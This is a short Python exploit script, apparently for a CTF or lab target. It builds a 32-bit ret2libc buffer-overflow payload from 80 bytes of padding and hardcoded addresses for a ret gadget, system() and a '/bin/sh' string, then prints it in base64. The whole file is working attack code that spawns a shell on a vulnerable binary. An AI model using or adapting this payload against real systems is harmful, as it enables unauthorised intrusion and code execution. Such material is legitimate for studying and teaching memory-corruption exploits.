import struct
from base64 import b64encode

offset = 80
ret_addr = 0x08048363
system_addr = 0xb7e6b060
binsh_addr = 0xb7f8cc58

payload = b"A" * offset
payload += struct.pack("I", ret_addr)    # address of ret gadget
payload += struct.pack("I", system_addr) # address of system() in libc
payload += b"B" * 4                      # return address for system() -> don't care
payload += struct.pack("I", binsh_addr)  # argument of system() -> there is "/bin/sh" string in libc

print(b64encode(payload).decode())